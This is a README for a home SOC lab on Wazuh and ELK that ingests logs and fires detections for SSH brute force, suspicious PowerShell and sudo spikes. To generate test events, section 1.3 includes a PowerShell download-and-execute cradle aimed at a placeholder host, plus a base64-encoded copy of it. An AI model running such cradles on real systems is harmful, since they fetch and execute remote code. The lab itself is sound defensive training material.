# BlueTrace SOC Lab (Wazuh / ELK)

A mini-SOC you can run on your laptop or a VM. It ingests Windows + Linux logs,
fires detections (SSH brute force, suspicious PowerShell, sudo spikes), alerts to Slack/email,
and shows dashboards for triage. Includes **two tracks**:

- **Track A – Wazuh** (fastest path to SOC-style results)
- **Track B – ELK** (DIY Elasticsearch + Kibana + Logstash + Beats)

> Tip: Start with **Wazuh** first if you're brand new. Then try ELK to learn the plumbing.
> Default timezone: IST (Asia/Kolkata) — adapt to your env as needed.

---

## 0) Prereqs

- Ubuntu 22.04+ (or similar) host with Docker + Docker Compose plugin
- One Linux endpoint VM (Ubuntu/Debian) and one Windows endpoint VM
- Optional: Slack Incoming Webhook URL (for alerting), or SMTP creds

Install Docker (Ubuntu):

```bash
sudo apt-get update
sudo apt-get install -y ca-certificates curl gnupg lsb-release
sudo install -m 0755 -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] \
https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | \
sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
sudo apt-get update
sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin
sudo usermod -aG docker $USER  # logout/login after this
```

---

## 1) Track A – Wazuh (Recommended First)

### 1.1 Bring up Wazuh (single-node)
```bash
git clone https://github.com/wazuh/wazuh-docker.git
cd wazuh-docker/single-node
./generate-indexer-certs.sh
docker compose up -d
```

- Dashboard: `https://<manager-ip>:5601` (Wazuh UI)
- Manager API: `https://<manager-ip>:55000`
- Verify: `docker ps` shows `wazuh.manager`, `wazuh.indexer`, `wazuh.dashboard`

### 1.2 Install agents on endpoints

**Linux endpoint (Ubuntu/Debian):**
```bash
curl -s https://packages.wazuh.com/4.x/bash/install.sh | sudo bash
sudo /var/ossec/bin/agent-auth -m <WAZUH_MANAGER_IP>
sudo systemctl enable wazuh-agent --now
```

**Windows endpoint:**
- Download matching Wazuh Agent MSI, install, set **Manager address** to `<WAZUH_MANAGER_IP>`, start service.

**Manager – verify agents:**
```bash
docker exec -it wazuh.manager /var/ossec/bin/list_agents -c
```

### 1.3 Ensure logs exist & generate test activity

**Linux endpoint:**
```bash
sudo apt-get install -y rsyslog
sudo systemctl enable --now rsyslog
ls -lah /var/log/auth.log

# Generate test events
bash scripts/linux_generate_auth_noise.sh   # from this repo (copy to endpoint), OR run inline:
for i in {1..7}; do ssh wronguser@localhost -o PreferredAuthentications=password -o PubkeyAuthentication=no; done
sudo -k; for i in {1..6}; do sudo -l; done
```

**Windows endpoint: enable PowerShell Script Block Logging (run as Admin):**
```powershell
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell" -ErrorAction SilentlyContinue | Out-Null
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -ErrorAction SilentlyContinue | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -Value 1 -Type DWord

# Generate test events
powershell -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('http://example.test/script.ps1')"
powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcAA6AC8ALwBlAHgAYQBtAHAAbABlAC4AdABlAHMAdAAvAHMALgBwAHMAMQAnACkA
```

### 1.4 Load local detection rules
Copy `wazuh/wazuh-local_rules.xml` from this repo into the **manager** at:
`/var/ossec/etc/rules/local_rules.xml` then restart:

```bash
docker cp wazuh/wazuh-local_rules.xml wazuh.manager:/var/ossec/etc/rules/local_rules.xml
docker exec -it wazuh.manager /var/ossec/bin/wazuh-control restart
docker exec -it wazuh.manager tail -f /var/ossec/logs/alerts/alerts.json
```

### 1.5 Alerting (Slack quick integration)
- Put your Slack webhook in `wazuh/ossec_integration_snippet.xml` (or edit on manager).
- Copy the script to manager & restart:

```bash
docker cp wazuh/integrations/custom-slack wazuh.manager:/var/ossec/integrations/custom-slack
docker cp wazuh/ossec_integration_snippet.xml wazuh.manager:/var/ossec/etc/shared/ossec_integration_snippet.xml
# Manually merge the snippet into /var/ossec/etc/ossec.conf under <ossec_config> if desired.
docker exec -it wazuh.manager /var/ossec/bin/wazuh-control restart
```

> Alternative: configure SMTP in `ossec.conf` for email.

### 1.6 Dashboards
Open `https://<manager-ip>:5601` and create visualizations:
- **Failed SSH over time** (filter: `Failed password`)
- **Top Source IPs (failures)** (terms on `srcip`/`source.ip` if parsed)
- **Suspicious PowerShell over time**
- **Sudo actions over time**
Save as **BlueTrace SOC – Overview**.

---

## 2) Track B – ELK (DIY)

### 2.1 Prep host kernel setting
```bash
sudo sysctl -w vm.max_map_count=262144
echo "vm.max_map_count=262144" | sudo tee -a /etc/sysctl.conf
```

### 2.2 Start stack
```bash
cd elk
docker compose up -d
# Kibana: http://<manager-ip>:5601  | Elasticsearch: http://<manager-ip>:9200
```

### 2.3 Linux endpoint → Filebeat → Logstash
On Linux endpoint:
```bash
sudo apt-get update && sudo apt-get install -y filebeat
sudo cp elk/filebeat/filebeat.yml /etc/filebeat/filebeat.yml  # edit <MANAGER_IP>
sudo filebeat modules enable system
sudo systemctl enable filebeat --now
```

### 2.4 Windows endpoint → Winlogbeat → Logstash
- Extract Winlogbeat on Windows: `C:\Program Files\Winlogbeat`
- Copy `elk/winlogbeat/winlogbeat.yml` there and edit `<MANAGER_IP>`.
- Run as Admin:
```bat
cd "C:\Program Files\Winlogbeat"
winlogbeat.exe setup
powershell -ExecutionPolicy Bypass -File .\install-service-winlogbeat.ps1
Start-Service winlogbeat
```

### 2.5 Detections (Kibana Rules)
Create three rules with KQL from `detections/kibana-kql/*`:
- **SSH brute force** → 6+ events in 5 minutes grouped by `source.ip`
- **Suspicious PowerShell** → keywords pattern
- **Linux privilege escalation** → sudo spikes

### 2.6 Dashboards
Create Data View `logs-*`, then build charts and a dashboard
(**BlueTrace SOC – Overview**).

---

## 3) Mocking (no endpoints yet?)

- Use `mocking/auth.log` & point Filebeat on the manager at `mocking/filebeat.yml`.
- Or copy/paste and run the noise scripts on endpoints.

---

## 4) Incident Documentation
Use `reports/templates/incident_template.md` for each fired alert.
Export to PDF for your portfolio.

---

## 5) Troubleshooting

- **No data**: check Filebeat/Winlogbeat services and Kibana Discover → correct index pattern.
- **Wazuh agent disconnected**: version mismatch / network; view `/var/ossec/logs/ossec.log`.
- **Elasticsearch not starting**: ensure `vm.max_map_count=262144` and enough RAM (`ES_JAVA_OPTS` in compose).
- **Rules not firing**: wrong index name in rule, or timestamps out of range (sync NTP).

---

## 6) Credits / License
MIT – use freely for learning and portfolios.
